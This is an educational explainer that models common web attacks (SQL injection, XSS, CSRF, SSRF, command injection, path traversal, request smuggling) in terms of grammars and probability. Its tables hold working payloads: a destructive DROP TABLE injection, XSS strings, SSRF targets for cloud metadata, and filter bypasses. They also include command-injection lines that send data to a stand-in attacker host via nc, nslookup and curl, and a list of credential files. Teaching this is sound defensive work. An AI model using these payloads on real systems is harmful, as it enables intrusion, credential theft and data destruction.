# The Mathematics of Web Attacks — Grammar Injection and Parser Confusion

> *Web attacks exploit the boundary between data and code in structured languages. SQL injection breaks SQL grammar, XSS confuses HTML parsers, CSRF exploits stateless authentication, and SSRF abuses trust boundaries. Each attack has a formal model rooted in language theory and probability.*

---

## 1. SQL Injection — Grammar Injection

### SQL as a Formal Grammar

SQL is a context-free grammar. Injection occurs when user input modifies the parse tree:

**Intended query (parameterized):**

```sql
SELECT * FROM users WHERE id = $1    -- $1 is a leaf node (literal)
```

**Injected query (concatenated):**

```sql
SELECT * FROM users WHERE id = 1 OR 1=1 --
```

The input `1 OR 1=1 --` is parsed as SQL syntax, not a string literal — the Abstract Syntax Tree (AST) changes shape.

### Injection Types and Impact

| Type | Example | AST Effect | Severity |
|:---|:---|:---|:---:|
| Tautology | `' OR 1=1 --` | WHERE always true | Auth bypass |
| Union-based | `' UNION SELECT * FROM creds --` | Adds result set | Data exfil |
| Error-based | `' AND 1=CONVERT(int, @@version) --` | Forces type error | Info leak |
| Blind (boolean) | `' AND SUBSTRING(pw,1,1)='a' --` | True/false oracle | Slow exfil |
| Blind (time) | `'; WAITFOR DELAY '0:0:5' --` | Timing oracle | Slow exfil |
| Stacked | `'; DROP TABLE users --` | New statement | Destructive |

### Blind SQLi Data Extraction Rate

Boolean-blind: one bit per request. For an $n$-character string:

$$\text{Requests} = n \times \lceil \log_2(|\text{charset}|) \rceil$$

Binary search over printable ASCII (95 chars):

$$\text{Requests} = n \times \lceil \log_2(95) \rceil = n \times 7$$

| Target | Characters | Requests | Time (1 req/s) |
|:---|:---:|:---:|:---:|
| Username (16 chars) | 16 | 112 | 2 min |
| Password hash (64 chars) | 64 | 448 | 7.5 min |
| Database dump (100 KB) | 100,000 | 700,000 | 8.1 days |

Time-based blind is slower: each bit takes $T_{delay}$ seconds (typically 5s):

$$T_{total} = n \times 7 \times T_{delay} = 64 \times 7 \times 5 = 2{,}240 \text{ seconds} = 37 \text{ min}$$

---

## 2. XSS — HTML Parser Confusion

### XSS as Context Escape

XSS occurs when user data escapes its intended context in the HTML document:

| Context | Escape Sequence | Example Payload |
|:---|:---|:---|
| HTML body | `<` → `&lt;` | `<script>alert(1)</script>` |
| HTML attribute | `"` → `&quot;` | `" onmouseover="alert(1)` |
| JavaScript string | `'` → `\'` | `'; alert(1)//` |
| URL parameter | `%` encoding | `javascript:alert(1)` |
| CSS value | `\` escape | `expression(alert(1))` |

### XSS Types and Persistence

| Type | Storage | Trigger | Victims |
|:---|:---|:---|:---:|
| Reflected | URL/request | Click malicious link | 1 per click |
| Stored | Database/file | Visit page | All visitors |
| DOM-based | Client-side | Click/navigate | 1 per click |
| Mutation | HTML parser quirk | DOM mutation | All visitors |

### Cookie Theft Probability

If XSS is present and cookies lack HttpOnly:

$$P(\text{cookie theft}) = P(\text{XSS exists}) \times P(\text{no HttpOnly}) \times P(\text{user visits})$$

---

## 3. CSRF — Token Entropy Requirements

### CSRF Token Security

A CSRF token must be unguessable:

$$P(\text{guess token}) = \frac{1}{2^{H_{token}}}$$

| Token Implementation | Entropy | Guessability |
|:---|:---:|:---:|
| Sequential integer | $\log_2(N)$ | Predictable |
| Timestamp-based | ~30 bits | Guessable |
| Random 32-byte hex | 128 bits | $2^{-128}$ |
| Random 32-byte Base64 | 192 bits | $2^{-192}$ |

### CSRF Token Requirements (OWASP)

$$H_{token} \geq 128 \text{ bits of entropy}$$

Using a CSPRNG: `token = random_bytes(32).hex()` → 256 bits.

### SameSite Cookie Defense

| SameSite Value | CSRF Protection | Cross-Site Requests |
|:---|:---:|:---|
| Strict | Full | All blocked |
| Lax | Partial | GET allowed, POST blocked |
| None (+ Secure) | None | All allowed |
| Not set (default=Lax) | Partial | GET allowed, POST blocked |

---

## 4. SSRF — Server-Side Request Forgery

### Trust Boundary Model

$$\text{SSRF exploits:} \quad \text{Trust}(\text{server} \to \text{internal}) > \text{Trust}(\text{client} \to \text{internal})$$

The server has access to internal resources the client does not.

### Attack Surface

| Target | URL Pattern | Impact |
|:---|:---|:---|
| Cloud metadata | `http://169.254.169.254/` | AWS/GCP credentials |
| Internal services | `http://10.0.0.5:8080/admin` | Admin access |
| Localhost | `http://127.0.0.1:6379/` | Redis/DB access |
| File system | `file:///etc/passwd` | File read |

### Cloud Metadata: Critical Impact

AWS Instance Metadata Service (IMDSv1) returns IAM credentials:

$$\text{SSRF to metadata} \to \text{IAM role credentials} \to \text{AWS account access}$$

IMDSv2 requires a PUT token (mitigates SSRF):

$$P(\text{exploit IMDSv2}) \ll P(\text{exploit IMDSv1})$$

### Bypass Techniques

| Defense | Bypass | Encoded Form |
|:---|:---|:---|
| Block `127.0.0.1` | Use `0x7f000001` | Hex encoding |
| Block `localhost` | Use `127.0.0.1` or `[::1]` | IP form |
| Block private IPs | Use DNS rebinding | Attacker DNS → internal IP |
| Allowlist domains | Open redirect on allowed domain | Chain redirects |

---

## 5. Command Injection — Shell Grammar Breaking

### Shell Metacharacters

| Character | Effect | Example |
|:---|:---|:---|
| `;` | Command separator | `; cat /etc/passwd` |
| `\|` | Pipe | `\| nc attacker 4444` |
| `` ` `` | Command substitution | `` `whoami` `` |
| `$()` | Command substitution | `$(whoami)` |
| `&&` | Conditional AND | `&& cat /etc/shadow` |
| `\|\|` | Conditional OR | `\|\| cat /etc/shadow` |
| `>` | Redirect output | `> /var/www/shell.php` |

### Blind Command Injection Detection

| Technique | Payload | Detection Method |
|:---|:---|:---|
| Time-based | `; sleep 5` | Response delay = 5s |
| DNS exfil | `` ; nslookup `whoami`.attacker.com `` | DNS query received |
| HTTP exfil | `; curl attacker.com/$(whoami)` | HTTP request received |
| File creation | `; touch /tmp/pwned` | Check file existence |

### Out-of-Band Data Exfiltration Rate

Via DNS (max 253 chars per query, ~60 useful bytes):

$$R_{exfil} = \frac{60 \text{ bytes}}{T_{query}} \approx 60 \text{ bytes/second}$$

For `/etc/shadow` (2 KB): $\frac{2048}{60} = 34$ seconds.

---

## 6. Path Traversal — Directory Escape

### Traversal Sequences

$$\text{payload} = \underbrace{../../../\ldots/}_{d \text{ levels}} \text{target\_file}$$

Where $d$ is the depth from the application's document root to the filesystem root.

### Common Targets

| File | Content | Value |
|:---|:---|:---|
| `/etc/passwd` | User accounts | Enumeration |
| `/etc/shadow` | Password hashes | Credential theft |
| `/proc/self/environ` | Environment variables | Secrets, keys |
| `/var/log/auth.log` | Auth events | Credential harvesting |
| `~/.ssh/id_rsa` | SSH private key | Lateral movement |

### Bypass Encoding

| Defense | Bypass |
|:---|:---|
| Block `../` | `..%2f`, `..%252f`, `....//` |
| Normalize path | Null byte: `../../../etc/passwd%00.png` |
| Allowlist extension | Double extension: `file.php.jpg` |

---

## 7. HTTP Request Smuggling

### CL/TE Desynchronization

When a frontend (proxy) and backend disagree on request boundaries:

**Content-Length says:** body is 13 bytes
**Transfer-Encoding says:** chunked (body ends at `0\r\n`)

$$\text{Smuggling} \iff \text{Frontend interpretation} \neq \text{Backend interpretation}$$

### Desync Types

| Type | Frontend Uses | Backend Uses |
|:---|:---|:---|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | TE (different parsing) | TE (different parsing) |

### Impact

| Attack | Effect | Severity |
|:---|:---|:---:|
| Request queue poisoning | Next user's request modified | Critical |
| Cache poisoning | Cached response contains attacker content | Critical |
| Auth bypass | Smuggled request bypasses auth proxy | Critical |
| XSS via smuggling | Reflected XSS via smuggled response | High |

---

## 8. Summary of Functions by Type

| Concept | Math Type | Application |
|:---|:---|:---|
| SQL AST injection | Formal grammar | SQL injection |
| $n \times \lceil \log_2 C \rceil$ requests | Binary search | Blind SQLi extraction |
| Context escape | Parser state machine | XSS |
| $2^{-128}$ token guess | Probability | CSRF token security |
| Trust boundary | Set containment | SSRF |
| Shell metacharacters | Grammar injection | Command injection |
| CL $\neq$ TE | Protocol ambiguity | Request smuggling |

---

*Web attacks exploit the fundamental tension between data and code — every parser boundary is a potential injection point, every trust assumption is a potential bypass, and every protocol ambiguity is a potential desynchronization. Defense requires understanding the grammar of every language the application speaks.*
